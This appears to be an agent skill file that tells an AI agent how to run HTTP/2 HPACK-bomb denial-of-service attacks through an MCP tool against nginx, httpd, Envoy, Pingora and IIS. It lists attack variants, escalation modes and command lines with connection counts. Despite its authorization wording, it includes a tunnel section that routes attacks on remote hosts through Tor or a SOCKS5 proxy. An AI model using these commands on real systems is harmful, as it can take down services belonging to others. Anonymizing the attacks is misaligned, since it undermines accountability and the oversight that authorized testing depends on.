---
name: http2-bomb
description: Run authorized HTTP/2 HPACK-bomb DoS checks via http2-bomb MCP (califio PoCs). Use for nginx/httpd/envoy/pingora/IIS hardening tests on owned or contracted targets.
---

# HTTP/2 Bomb MCP

## When to use

- Validate **HTTP/2 HPACK amplification + window stall** (MADBugs/http2-bomb) on authorized targets
- Post-patch regression: `probe` / `safe` profiles
- Before full PoC: `estimate_http2_bomb_impact` and `list_http2_bomb_variants`

## Workflow

1. `probe_http2` — TLS + ALPN `h2`, no attack
2. `list_http2_bomb_variants` — pick stack (nginx vs httpd cookie vs envoy …)
3. Optional: copy `allowed_targets.json.example` → `allowed_targets.json`
4. `run_http2_bomb_test` with `authorization_confirmed=true` and `scope_description` (ticket/customer, min. 12 chars)
5. Start with `safe`; use `moderate` / `aggressive` only in isolated labs

## Variant mapping

| Stack | variant |
|-------|---------|
| nginx | nginx |
| Apache httpd mod_http2 | httpd |
| Envoy | envoy |
| Pingora | pingora |
| IIS | microsoft-iis (Windows) |

## Enhanced benchmark (v2)

Modules: `variants.py`, `attack_config.py`, `campaigns/`, `h2_enhanced.py`, `cookie_bomb_enhanced.py`

| Stack | variant | Apex benchmark modes |
|-------|---------|----------------------|
| nginx / Pingora | `nginx`, `pingora` | `apex`, `apex_scaled`, `apex_mp` |
| httpd / Envoy | `httpd`, `envoy` | `apex_cookie`, `apex_cookie_scaled`, `apex_cookie_mp` |
| IIS | `microsoft-iis` | `apex_iis_mp` (Windows PowerShell) |

### Lab execution (recommended)

**Do not** probe `127.0.0.1:8443` from your laptop unless Docker lab runs locally.

```bash
# Deploy + smoke on Proxmox ai-workstation (192.168.2.116)
./lab-replay/deploy_proxmox.sh smoke
./lab-replay/deploy_proxmox.sh campaign

# On lab VM directly (nginx Docker @ 127.0.0.1:8443)
python3 benchmark/benchmark_runner.py --host 127.0.0.1 --port 8443 \
  --variant nginx --mode apex_scaled --connections 20
```

MCP: `run_http2_bomb_benchmark` with `variant=` and `mode=` (see `list_http2_bomb_variants`).

## Tunnel

```bash
./bin/http2-bomb tunnel set --mode tor
python3 benchmark/benchmark_runner.py --host TARGET --allow-remote --tunnel-mode socks5 \
  --proxy-url socks5://127.0.0.1:1080 --mode apex --connections 55
```

MCP: `configure_http2_bomb_tunnel`, or `tunnel_mode`/`proxy_url` on run tools.

## Terminal CLI

```bash
./bin/http2-bomb menu
./bin/http2-bomb probe --host TARGET   # not 127.0.0.1 unless lab is local
```

## Legal

Authorized targets only. No scanning of third-party infrastructure without written permission.
